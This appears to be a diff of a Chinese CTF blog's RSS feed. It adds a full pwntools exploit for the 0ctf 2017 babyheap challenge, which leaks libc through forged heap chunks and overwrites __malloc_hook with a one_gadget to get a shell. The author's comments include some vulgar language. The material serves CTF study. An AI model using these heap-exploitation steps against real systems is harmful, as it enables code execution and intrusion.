@@ -279,6 +279,116 @@ Command: $
 &lt;p&gt;那么问题出在哪里呢&lt;/p&gt;
 &lt;p&gt;题目的libc.so.6跟你下载的真的一样吗&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;https://dxfaker.top/images/post/4aab05c577ec3139f277fd3ca68c6d95.png&quot; alt=&quot;4aab05c577ec3139f277fd3ca68c6d95&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;debug&apos;)
+context.terminal = [&apos;cmd.exe&apos;, &apos;/c&apos;, &apos;start&apos;, &apos;wsl.exe&apos;, &apos;bash&apos;, &apos;-c&apos;]
+
+exe = ELF(&quot;./pwn_patched&quot;)
+context.binary = exe
+# p =  remote(&quot;ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com&quot;, 9999, ssl=True, sni=&quot;ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com&quot;)
+p =  process(&quot;./pwn_patched&quot;)
+libc = ELF(&quot;./libc.so.6&quot;)
+
+def add_chunk(size):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;1&apos;)
+    p.recvuntil(b&apos;Size: &apos;)
+    p.sendline(str(size).encode())
+    
+def edit_chunk(idx, size, content):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;2&apos;)
+    p.recvuntil(b&apos;Index: &apos;)
+    p.sendline(str(idx).encode())
+    p.recvuntil(b&apos;Size: &apos;)
+    p.sendline(str(size).encode())
+    p.recvuntil(b&apos;Content: &apos;)
+    p.send(content)
+    
+def free_chunk(idx):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;3&apos;)
+    p.recvuntil(b&apos;Index: &apos;)
+    p.sendline(str(idx).encode())
+    
+def show_content(idx):
+    p.recvuntil(b&apos;Command: &apos;)
+    p.sendline(b&apos;4&apos;)
+    p.recvuntil(b&apos;Index: &apos;)
+    p.sendline(str(idx).encode())
+    
+
+
+fake_chunk = flat({
+            0x100: 0x110,
+            0x108: 0x221,}, filler = &apos;\x00&apos;)
+            
+            
+add_chunk(256)
+add_chunk(256)
+add_chunk(256)
+add_chunk(256)
+edit_chunk(0, len(fake_chunk), fake_chunk)
+# gdb.attach(p)
+free_chunk(1)
+add_chunk(256)
+show_content(2)
+gdb.attach(p)
+# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E &apos; __free_hook$| __malloc_hook$| __realloc_hook$| system$&apos;
+# 5654: 00000000000453a0    45 FUNC    WEAK   DEFAULT   13 system
+# 6241: 00000000003c4b10     8 OBJECT  WEAK   DEFAULT   33 __malloc_hook
+# 6248: 00000000003c67a8     8 OBJECT  WEAK   DEFAULT   34 __free_hook
+# 7294: 00000000003c4b08     8 OBJECT  WEAK   DEFAULT   33 __realloc_hook
+# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E &apos;main_arena&apos;
+   # 915: 00000000003c4b20  2192 OBJECT  LOCAL  DEFAULT   33 main_arena
+   # (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ one_gadget ./libc.so.6
+# 0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+p.recvuntil(b&apos;Content: &apos;)   # 吃掉 &quot;Content: &quot;
+p.recv(1)                   # 吃掉那个 &apos;\n&apos;
+leak = u64(p.recv(8).ljust(8, b&apos;\x00&apos;))
+libc.address = leak - 88 - 0x3c4b20
+system_add = libc.address + 0x453a0
+free_hook  = libc.address + 0x3c67a8 
+malloc_hook = 0x3c4b10 + libc.address
+fake_chunk_addr = malloc_hook - 0x23 
+fb_freehook = free_hook - 0x18
+bk_freehook = free_hook - 0x10
+# one_gadget = libc.address + 0x4527a  我草死你的吗
+one_gadget = libc.address + 0x4526a   # 原版 libc-2.23.so，不是 11.3 的 0x4527a
+
+# 如果还不行，再换：
+# 
+log.info(f&quot;leak         = {hex(leak)}&quot;)
+log.info(f&quot;libc.address = {hex(libc.address)}&quot;)
+log.info(f&quot;one_gadget   = {hex(one_gadget)}   off={hex(one_gadget - libc.address)}&quot;)
+log.info(f&quot;fake_chunk   = {hex(fake_chunk_addr)}   off={hex(fake_chunk_addr - libc.address)}&quot;)
+log.info(f&quot;malloc_hook  = {hex(malloc_hook)}   off={hex(malloc_hook - libc.address)}&quot;)
+add_chunk(96)#4
+add_chunk(96)#5
+add_chunk(96)#6
+add_chunk(96)#7
+free_chunk(5)
+
+fakechunk = flat({
+    0x60: 0x60,
+    0x68: 0x71,
+    0x70: fake_chunk_addr
+},filler = b&apos;\x00&apos;)
+
+edit_chunk(4, len(fakechunk), fakechunk)
+
+add_chunk(96)#7
+add_chunk(96)#8
+# payload = p64(0) + p64(system_add)
+# edit_chunk(8, len(payload), payload)
+# add_chunk(0x10)
+# edit_chunk(9, 8, b&apos;/bin/sh\x00&apos;)
+# free_chunk(9)
+payload = b&apos;\x00&apos; * 0x13 + p64(one_gadget)
+edit_chunk(8, len(payload), payload)
+add_chunk(0x10) 
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
 </content:encoded></item><item><title>手撕ycb pwn 01</title><link>https://dxfaker.top/posts/ycbpwn1/</link><guid isPermaLink="true">https://dxfaker.top/posts/ycbpwn1/</guid><description>nmsl</description><pubDate>Tue, 27 Oct 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
 &lt;p&gt;你要问我为什么先出的是ycb的wp而不是aurora26 ctf的，我只能说我把ycb这个贵物题写出来比pwn ak了还几把爽&lt;/p&gt;
 &lt;h1&gt;正文&lt;/h1&gt;
